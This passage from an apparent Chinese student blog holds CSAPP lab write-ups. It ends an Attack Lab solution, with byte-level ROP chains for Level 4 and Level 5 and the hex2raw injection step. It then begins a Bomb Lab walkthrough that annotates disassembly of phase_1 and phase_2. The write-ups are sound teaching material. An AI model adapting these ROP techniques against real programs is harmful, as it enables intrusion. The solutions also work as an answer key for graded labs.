class="hljs-number">4019</span>a0:<span class="hljs-number">8</span>d <span class="hljs-number">87</span> <span class="hljs-number">48</span> <span class="hljs-number">89</span> c7 c3    lea    <span class="hljs-number">-0x3c3876b8</span>(%rdi),%eax<br>  <span class="hljs-number">4019</span>a6:c3     <br></code></pre></td></tr></table></figure><p>我们可以知道<code>movq %rax, %rdi</code>的指令地址为<code>4019a2</code>。</p><p>以上，我们可以得出我们需要的字符串为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><span class="hljs-comment">//填满缓冲区</span><br>ab <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><span class="hljs-comment">//popq %rax</span><br>fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><span class="hljs-comment">//cookie</span><br>a2 <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><span class="hljs-comment">//movq %rax, %rdi</span><br>ec <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><span class="hljs-comment">//返回到touch2()函数</span><br></code></pre></td></tr></table></figure><p>最后通过<code>hex2raw</code>程序生成字节码进行注入，得到如下结果：<br><img src="/images/lab38.png"></p><h4 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h4><p><del>这个真的难，麻了。</del></p><p>因为每次栈的位置都是随机的，所以我们只能通过栈顶地址+偏移量来索引字符串的起始地址。通过<code>lea(%rdi,%rsi,1),%rax</code>，这样就可以把字符串的首地址传到<code>%rax</code>。</p><p>我们首先要得到<code>%rsp</code>的地址，传送到<code>%rdi</code>，其次获取偏移量，传到<code>%rsi</code>。接着通过<code>lea(%rdi,%rsi,1),%rax</code>，将字符串的首地址传送到<code>%rax</code>，再传送到<code>%rdi</code>，最后调用<code>touch3()</code>函数。</p><p>然后就一个一个找就行了。太麻烦了。</p><p>需要的字符串为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-number">06</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>a2 <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>cc <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">48</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>dd <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">70</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">13</span> <span class="hljs-number">1</span>a <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>d6 <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>a2 <span class="hljs-number">19</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>fa <span class="hljs-number">18</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <br><span class="hljs-number">35</span> <span class="hljs-number">39</span> <span class="hljs-number">62</span> <span class="hljs-number">39</span> <span class="hljs-number">39</span> <span class="hljs-number">37</span> <span class="hljs-number">66</span> <span class="hljs-number">61</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><p>最后通过<code>hex2raw</code>程序生成字节码进行注入，得到如下结果：<br><img src="/images/lab39.png"></p>]]></content>
    
    
    <categories>
      
      <category>lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>csapp lab2</title>
    <link href="/2021/08/24/lab2_bomblab/"/>
    <url>/2021/08/24/lab2_bomblab/</url>
    
    <content type="html"><![CDATA[<p>利用暑假也是完成了csapp的第二个lab，和逆向有些关系，从中也是学到了很多，在此记录下来。</p><h4 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000400</span>ee0 &lt;phase_1&gt;:<br>  <span class="hljs-number">400</span>ee0:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0x8</span>,%rsp<span class="hljs-comment">//开辟空间</span><br>  <span class="hljs-number">400</span>ee4:be <span class="hljs-number">00</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x402400</span>,%esi<br>  <span class="hljs-number">400</span>ee9:e8 <span class="hljs-number">4</span>a <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">401338</span> &lt;strings_not_equal&gt;<br>  <span class="hljs-number">400</span>eee:<span class="hljs-number">85</span> c0                test   %eax,%eax<span class="hljs-comment">//判断返回值</span><br>  <span class="hljs-number">400</span>ef0:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>ef7 &lt;phase_1+<span class="hljs-number">0x17</span>&gt;<br>  <span class="hljs-number">400</span>ef2:e8 <span class="hljs-number">43</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400</span>ef7:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">08</span>          add    $<span class="hljs-number">0x8</span>,%rsp<br>  <span class="hljs-number">400</span>efb:c3                   retq     <br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000401338</span> &lt;strings_not_equal&gt;:<br>  <span class="hljs-number">401338</span>:<span class="hljs-number">41</span> <span class="hljs-number">54</span>                push   %r12<br>  <span class="hljs-number">40133</span>a:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-number">40133b</span>:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-number">40133</span>c:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fb             mov    %rdi,%rbx<br>  <span class="hljs-number">40133f</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f5             mov    %rsi,%rbp<br>  <span class="hljs-number">401342</span>:e8 d4 ff ff ff       callq  <span class="hljs-number">40131b</span> &lt;string_length&gt;<span class="hljs-comment">//获取我们输入的字符串长度</span><br>  <span class="hljs-number">401347</span>:<span class="hljs-number">41</span> <span class="hljs-number">89</span> c4             mov    %eax,%r12d<br>  <span class="hljs-number">40134</span>a:<span class="hljs-number">48</span> <span class="hljs-number">89</span> ef             mov    %rbp,%rdi<br>  <span class="hljs-number">40134</span>d:e8 c9 ff ff ff       callq  <span class="hljs-number">40131b</span> &lt;string_length&gt;<br>  <span class="hljs-number">401352</span>:ba <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x1</span>,%edx<br>  <span class="hljs-number">401357</span>:<span class="hljs-number">41</span> <span class="hljs-number">39</span> c4             cmp    %eax,%r12d<span class="hljs-comment">//两个字符串长度对比，不相等就爆炸</span><br>  <span class="hljs-number">40135</span>a:<span class="hljs-number">75</span> <span class="hljs-number">3f</span>                jne    <span class="hljs-number">40139b</span> &lt;strings_not_equal+<span class="hljs-number">0x63</span>&gt;<br>  <span class="hljs-number">40135</span>c:<span class="hljs-number">0f</span> b6 <span class="hljs-number">03</span>             <span class="hljs-built_in">movzbl</span> (%rbx),%eax<span class="hljs-comment">//后面就是循环，逐个对比了</span><br>  <span class="hljs-number">40135f</span>:<span class="hljs-number">84</span> c0                test   %al,%al<br>  <span class="hljs-number">401361</span>:<span class="hljs-number">74</span> <span class="hljs-number">25</span>                je     <span class="hljs-number">401388</span> &lt;strings_not_equal+<span class="hljs-number">0x50</span>&gt;<br>  <span class="hljs-number">401363</span>:<span class="hljs-number">3</span>a <span class="hljs-number">45</span> <span class="hljs-number">00</span>             cmp    <span class="hljs-number">0x0</span>(%rbp),%al<br>  <span class="hljs-number">401366</span>:<span class="hljs-number">74</span> <span class="hljs-number">0</span>a                je     <span class="hljs-number">401372</span> &lt;strings_not_equal+<span class="hljs-number">0x3a</span>&gt;<br>  <span class="hljs-number">401368</span>:eb <span class="hljs-number">25</span>                jmp    <span class="hljs-number">40138f</span> &lt;strings_not_equal+<span class="hljs-number">0x57</span>&gt;<br>  <span class="hljs-number">40136</span>a:<span class="hljs-number">3</span>a <span class="hljs-number">45</span> <span class="hljs-number">00</span>             cmp    <span class="hljs-number">0x0</span>(%rbp),%al<br>  <span class="hljs-number">40136</span>d:<span class="hljs-number">0f</span> <span class="hljs-number">1f</span> <span class="hljs-number">00</span>             <span class="hljs-built_in">nopl</span>   (%rax)<br>  <span class="hljs-number">401370</span>:<span class="hljs-number">75</span> <span class="hljs-number">24</span>                jne    <span class="hljs-number">401396</span> &lt;strings_not_equal+<span class="hljs-number">0x5e</span>&gt;<br>  <span class="hljs-number">401372</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c3 <span class="hljs-number">01</span>          add    $<span class="hljs-number">0x1</span>,%rbx<br>  <span class="hljs-number">401376</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c5 <span class="hljs-number">01</span>          add    $<span class="hljs-number">0x1</span>,%rbp<br>  <span class="hljs-number">40137</span>a:<span class="hljs-number">0f</span> b6 <span class="hljs-number">03</span>             <span class="hljs-built_in">movzbl</span> (%rbx),%eax<br>  <span class="hljs-number">40137</span>d:<span class="hljs-number">84</span> c0                test   %al,%al<br>  <span class="hljs-number">40137f</span>:<span class="hljs-number">75</span> e9                jne    <span class="hljs-number">40136</span>a &lt;strings_not_equal+<span class="hljs-number">0x32</span>&gt;<br>  <span class="hljs-number">401381</span>:ba <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%edx<br>  <span class="hljs-number">401386</span>:eb <span class="hljs-number">13</span>                jmp    <span class="hljs-number">40139b</span> &lt;strings_not_equal+<span class="hljs-number">0x63</span>&gt;<br>  <span class="hljs-number">401388</span>:ba <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%edx<br>  <span class="hljs-number">40138</span>d:eb <span class="hljs-number">0</span>c                jmp    <span class="hljs-number">40139b</span> &lt;strings_not_equal+<span class="hljs-number">0x63</span>&gt;<br>  <span class="hljs-number">40138f</span>:ba <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x1</span>,%edx<br>  <span class="hljs-number">401394</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">40139b</span> &lt;strings_not_equal+<span class="hljs-number">0x63</span>&gt;<br>  <span class="hljs-number">401396</span>:ba <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x1</span>,%edx<br>  <span class="hljs-number">40139b</span>:<span class="hljs-number">89</span> d0                mov    %edx,%eax<br>  <span class="hljs-number">40139</span>d:<span class="hljs-number">5b</span>                   pop    %rbx<br>  <span class="hljs-number">40139</span>e:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-number">40139f</span>:<span class="hljs-number">41</span> <span class="hljs-number">5</span>c                pop    %r12<br>  <span class="hljs-number">4013</span>a1:c3                   retq <br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">000000000040131b</span> &lt;string_length&gt;:<br>  <span class="hljs-number">40131b</span>:<span class="hljs-number">80</span> <span class="hljs-number">3f</span> <span class="hljs-number">00</span>             cmpb   $<span class="hljs-number">0x0</span>,(%rdi)<br>  <span class="hljs-number">40131</span>e:<span class="hljs-number">74</span> <span class="hljs-number">12</span>                je     <span class="hljs-number">401332</span> &lt;string_length+<span class="hljs-number">0x17</span>&gt;<br>  <span class="hljs-number">401320</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fa             mov    %rdi,%rdx<br>  <span class="hljs-number">401323</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c2 <span class="hljs-number">01</span>          add    $<span class="hljs-number">0x1</span>,%rdx<br>  <span class="hljs-number">401327</span>:<span class="hljs-number">89</span> d0                mov    %edx,%eax<br>  <span class="hljs-number">401329</span>:<span class="hljs-number">29</span> f8                sub    %edi,%eax<br>  <span class="hljs-number">40132b</span>:<span class="hljs-number">80</span> <span class="hljs-number">3</span>a <span class="hljs-number">00</span>             cmpb   $<span class="hljs-number">0x0</span>,(%rdx)<br>  <span class="hljs-number">40132</span>e:<span class="hljs-number">75</span> f3                jne    <span class="hljs-number">401323</span> &lt;string_length+<span class="hljs-number">0x8</span>&gt;<br>  <span class="hljs-number">401330</span>:f3 c3                repz retq <br>  <span class="hljs-number">401332</span>:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">401337</span>:c3                   retq   <br></code></pre></td></tr></table></figure><p>首先我们需要反汇编bomb程序，将结果重定向一下，然后便得到了上面的反汇编代码。</p><p>​    我们发现函数首先将<code>0x402400</code>移入到了<code>%esi</code>寄存器中，接着调用函数<code>string not equal</code>，接着往后读可以知道如果<code>%eax</code>寄存器的值如果是1的话，那么就会调用<code>explode bomb</code>函数，我们就会失败。所以，<code>%eax</code>的值必定是0。在此说明一下，<code>%eax</code>寄存器存放的是函数的返回值。所以<code>string not equal</code>函数返回值是0。在读<code>string not equal</code>的反汇编代码之前，<code>%esi</code>中存放了一个值，可以猜测这是一个地址。我们用gdb对程序进行调试。<br><img src="/images/lab21.png"></p><p>使用上图的指令可以查看该内存位置的值，我们发现是一个字符串。</p><p><code>%rdi</code>寄存器存放的是第一个参数的值，<code>%rsi</code>存放的是第二个参数的值，具体的寄存器用法在我另一篇blog中有详细的说明，在此不多加叙述。</p><p>通过调用<code>string length</code> 函数得到字符串的长度，<code>string not equal</code>函数先比较两个字符串的长度，接着在逐个对比，不等的话返回值为1。所以通过以上的分析，我们可以得出，phase_1就是通过比较我们输入的字符串和已有的字符串是否相等。</p><h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000400</span>efc &lt;phase_2&gt;:<br>  <span class="hljs-number">400</span>efc:<span class="hljs-number">55</span>                   push   %rbp<br>  <span class="hljs-number">400</span>efd:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-number">400</span>efe:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">28</span>          sub    $<span class="hljs-number">0x28</span>,%rsp<br>  <span class="hljs-number">400f</span>02:<span class="hljs-number">48</span> <span class="hljs-number">89</span> e6             mov    %rsp,%rsi<br>  <span class="hljs-number">400f</span>05:e8 <span class="hljs-number">52</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40145</span>c &lt;read_six_numbers&gt;<br>  <span class="hljs-number">400f</span>0a:<span class="hljs-number">83</span> <span class="hljs-number">3</span>c <span class="hljs-number">24</span> <span class="hljs-number">01</span>          cmpl   $<span class="hljs-number">0x1</span>,(%rsp)<span class="hljs-comment">//从这里可以知道，第一个数一定是1，否则炸弹就会爆炸</span><br>  <span class="hljs-number">400f</span>0e:<span class="hljs-number">74</span> <span class="hljs-number">20</span>                je     <span class="hljs-number">400f</span>30 &lt;phase_2+<span class="hljs-number">0x34</span>&gt;<br>  <span class="hljs-number">400f</span>10:e8 <span class="hljs-number">25</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>15:eb <span class="hljs-number">19</span>                jmp    <span class="hljs-number">400f</span>30 &lt;phase_2+<span class="hljs-number">0x34</span>&gt;<br>  <span class="hljs-number">400f</span>17:<span class="hljs-number">8b</span> <span class="hljs-number">43</span> fc             mov    <span class="hljs-number">-0x4</span>(%rbx),%eax<span class="hljs-comment">//前一个数</span><br>  <span class="hljs-number">400f</span>1a:<span class="hljs-number">01</span> c0                add    %eax,%eax<span class="hljs-comment">//加倍</span><br>  <span class="hljs-number">400f</span>1c:<span class="hljs-number">39</span> <span class="hljs-number">03</span>                cmp    %eax,(%rbx)<span class="hljs-comment">//后面一个数必须是前一个数的两倍，否则爆炸</span><br>  <span class="hljs-number">400f</span>1e:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400f</span>25 &lt;phase_2+<span class="hljs-number">0x29</span>&gt;<br>  <span class="hljs-number">400f</span>20:e8 <span class="hljs-number">15</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>25:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c3 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0x4</span>,%rbx<span class="hljs-comment">//向后移动一个数</span><br>  <span class="hljs-number">400f</span>29:<span class="hljs-number">48</span> <span class="hljs-number">39</span> eb             cmp    %rbp,%rbx<span class="hljs-comment">//判断是否结束，不结束继续加倍，结束直接return</span><br>  <span class="hljs-number">400f</span>2c:<span class="hljs-number">75</span> e9                jne    <span class="hljs-number">400f</span>17 &lt;phase_2+<span class="hljs-number">0x1b</span>&gt;<br>  <span class="hljs-number">400f</span>2e:eb <span class="hljs-number">0</span>c                jmp    <span class="hljs-number">400f</span>3c &lt;phase_2+<span class="hljs-number">0x40</span>&gt;<br>  <span class="hljs-number">400f</span>30:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">04</span>       lea    <span class="hljs-number">0x4</span>(%rsp),%rbx<span class="hljs-comment">//加载下一个数的地址</span><br>  <span class="hljs-number">400f</span>35:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">6</span>c <span class="hljs-number">24</span> <span class="hljs-number">18</span>       lea    <span class="hljs-number">0x18</span>(%rsp),%rbp<br>  <span class="hljs-number">400f</span>3a:eb db                jmp    <span class="hljs-number">400f</span>17 &lt;phase_2+<span class="hljs-number">0x1b</span>&gt;<br>  <span class="hljs-number">400f</span>3c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">28</span>          add    $<span class="hljs-number">0x28</span>,%rsp<br>  <span class="hljs-number">400f</span>40:<span class="hljs-number">5b</span>                   pop    %rbx<br>  <span class="hljs-number">400f</span>41:<span class="hljs-number">5</span>d                   pop    %rbp<br>  <span class="hljs-number">400f</span>42:c3                   retq   <br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">000000000040145</span>c &lt;read_six_numbers&gt;:<br>  <span class="hljs-number">40145</span>c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">401460</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> f2             mov    %rsi,%rdx<br>  <span class="hljs-number">401463</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>e <span class="hljs-number">04</span>          lea    <span class="hljs-number">0x4</span>(%rsi),%rcx<br>  <span class="hljs-number">401467</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">14</span>          lea    <span class="hljs-number">0x14</span>(%rsi),%rax<br>  <span class="hljs-number">40146b</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       mov    %rax,<span class="hljs-number">0x8</span>(%rsp)<br>  <span class="hljs-number">401470</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">10</span>          lea    <span class="hljs-number">0x10</span>(%rsi),%rax<br>  <span class="hljs-number">401474</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>          mov    %rax,(%rsp)<br>  <span class="hljs-number">401478</span>:<span class="hljs-number">4</span>c <span class="hljs-number">8</span>d <span class="hljs-number">4</span>e <span class="hljs-number">0</span>c          lea    <span class="hljs-number">0xc</span>(%rsi),%r9<br>  <span class="hljs-number">40147</span>c:<span class="hljs-number">4</span>c <span class="hljs-number">8</span>d <span class="hljs-number">46</span> <span class="hljs-number">08</span>          lea    <span class="hljs-number">0x8</span>(%rsi),%r8<br>  <span class="hljs-number">401480</span>:be c3 <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x4025c3</span>,%esi<br>  <span class="hljs-number">401485</span>:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">40148</span>a:e8 <span class="hljs-number">61</span> f7 ff ff       callq  <span class="hljs-number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;<br>  <span class="hljs-number">40148f</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">05</span>             cmp    $<span class="hljs-number">0x5</span>,%eax<br>  <span class="hljs-number">401492</span>:<span class="hljs-number">7f</span> <span class="hljs-number">05</span>                jg     <span class="hljs-number">401499</span> &lt;read_six_numbers+<span class="hljs-number">0x3d</span>&gt;<br>  <span class="hljs-number">401494</span>:e8 a1 ff ff ff       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">401499</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          add    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">40149</span>d:c3                   retq   <br></code></pre></td></tr></table></figure><p>首先，phase_2需要读6个数进来，通过使用gdb对<code>0x4025c3</code>地址处的查看，<br><img src="/images/lab22.png">我们发现是读6个整数进来，读入的数小于或者等于5就会触发炸弹。</p><p>通过以上的注释可以发现，就是一个以1为首项，2为公比的等比数列，输入前6个即可。</p><h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 